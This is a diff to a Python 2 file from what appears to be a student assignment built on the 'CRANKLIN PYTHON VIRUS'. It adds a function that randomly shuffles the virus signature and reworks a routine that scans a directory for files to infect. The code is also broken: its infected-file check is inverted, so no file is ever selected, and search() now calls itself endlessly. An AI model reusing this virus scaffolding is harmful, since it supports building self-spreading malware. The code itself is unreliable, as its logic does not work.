@@ -1,7 +1,18 @@
 import os
 import datetime
-import sys
+import random, array
+
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
+def shuffle_text(SIGNATURE):
+    if isinstance(SIGNATURE, unicode):
+        temp= array.array('u', SIGNATURE)
+        converter= temp.tounicode
+    else:
+        temp= array.array('c', SIGNATURE)
+        converter= temp.tostring
+    random.shuffle(temp)
+    return converter()
+
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
@@ -12,15 +23,13 @@ def search(path):
             infected = False
             for line in open(path+"/"+fname):
                 if SIGNATURE in line:
-                    infected = True
+                    infected = False
                     break
-            if infected == False:
+            if infected == True:
                 filestoinfect.append(path+"/"+fname)
-    return filestoinfect
-def files ():
     filestoinfect = search(os.path.abspath("\Users\MANO\Downloads\ECS 189M\progAss1"))
     for fname in filestoinfect:
         print ("kjhkjh")
         print (fname)
-files()		
-		
+    return filestoinfect
+	
